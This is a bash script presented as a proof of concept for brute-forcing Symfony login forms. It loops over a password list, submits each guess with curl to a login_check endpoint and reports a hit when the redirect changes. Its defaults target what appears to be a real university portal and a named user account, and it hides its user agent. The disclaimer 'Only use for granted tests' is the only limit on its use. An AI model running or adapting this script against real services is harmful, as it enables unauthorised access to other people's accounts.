#!/bin/bash

doesntExists () {
	echo "$1 does not exists. Cannot go further."
	exit 1
}

# Init main variables
DOMAIN="https://clarolineconnect.univ-lyon1.fr"
COOKIE="Cookie: PHPSESSID=0"
PASSLIST="pass.txt"
ACCOUNT="lucas.tesson"

# Parse arguments
for i in "$@"
do
case $i in
	-d=*|--domain=*)
	DOMAIN="${i#*=}"
	shift
	;;
	-c=*|--cookie=*)
	COOKIE="${i#*=}"
	shift
	;;
	-p=*|--passlist=*)
	PASSLIST="${i#*=}"
	shift
	;;
	-a=*|--account=*)
	ACCOUNT="${i#*=}"
	shift
	;;
esac
done

# Start exec
echo "##### STARTING #####"
echo ""
echo "This script is a POC of a Symfony's login bruteforcer. Only use for granted tests."
echo ""
echo "DOMAIN   = ${DOMAIN}"
echo "COOKIE   = ${COOKIE}"
echo "PASSLIST = ${PASSLIST}"
echo "ACCOUNT  = ${ACCOUNT}"
echo ""

# Check for PASSLIST
if [ ! -f "$PASSLIST" ]; then
	doesntExists $PASSLIST
fi

# Chech if domain exists
if curl -o '/dev/null' -sI "$DOMAIN"; then
	echo "Domain exists."
else
	doesntExists $DOMAIN
fi

# Crossing through each line (password)
while IFS= read -r pass
do
	echo "Checking for: ${ACCOUNT} | ${pass}"
	# Test credentials
	redirect_url=$(curl --data-urlencode "_username=${ACCOUNT}" --data-urlencode "_password=${pass}" "${DOMAIN}/login_check" -o '/dev/null' -w '%{redirect_url}' -H "${COOKIE}" -A "Hidden" -s)
	if [ "$redirect_url" != "${DOMAIN}/login" ]; then
		echo "Found password: ${pass}"
		break
	fi
done < "$PASSLIST"

# End exec
echo "##### FINISHED #####"
